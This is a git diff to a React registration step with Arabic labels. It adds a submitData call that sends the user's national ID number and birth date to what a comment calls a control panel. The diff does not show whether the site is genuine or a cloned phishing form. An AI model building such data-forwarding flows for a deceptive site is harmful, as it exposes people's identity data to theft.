@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function RegisterStep2() {
   const [, setLocation] = useLocation();
@@ -95,6 +96,19 @@ export default function RegisterStep2() {
     }
     
     setShowErrors(false);
+    
+    // إرسال البيانات للوحة التحكم
+    const months = calendarType === 'gregorian' ? 
+      ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'] :
+      ['محرم', 'صفر', 'ربيع الأول', 'ربيع الثاني', 'جمادى الأولى', 'جمادى الآخرة', 'رجب', 'شعبان', 'رمضان', 'شوال', 'ذو القعدة', 'ذو الحجة'];
+    const monthName = months[parseInt(month) - 1] || month;
+    
+    submitData({
+      'رقم الهوية': idNumber,
+      'تاريخ الميلاد': `${day} ${monthName} ${year}`,
+      'نوع التقويم': calendarType === 'gregorian' ? 'ميلادي' : 'هجري',
+    });
+    
     // Navigate to step 3 with account type
     setLocation(`/register-step3?type=${accountType}`);
   };
